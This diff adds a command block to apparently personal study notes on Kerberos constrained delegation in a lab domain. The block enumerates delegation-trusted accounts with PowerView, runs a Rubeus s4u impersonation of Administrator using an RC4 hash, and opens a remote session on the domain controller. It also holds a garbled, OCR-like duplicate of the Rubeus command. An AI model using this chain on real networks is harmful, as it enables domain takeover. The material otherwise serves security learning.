@@ -47,6 +47,24 @@ KDC responds:
 > [!NOTE] Note
 > The KDC does NOT require the user’s password when issuing a delegated ticket
 
+```bash
+
+Unblock-File .\PowerView-main.ps1
+. .\PowerView-main.ps1
+Get-NetUser -TrustedToAuth
+
+.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
+
+
+C:\Users\bob\Downloads>I.\Rubeus. exe s4u /user:webservice /rc4: FCDC65703DD2BOBD789977F1F3EEAECF /domain: eagle. local
+/impersonateuser : Administrator /msdsspn: "http/dc1" /dc: dcl. eagle. local /ptt
+
+klist
+
+Enter-PSSession dc1
+```
+
+
 ### Unconstrained Delegation:
 - Can impersonate any user
 - Can access any service
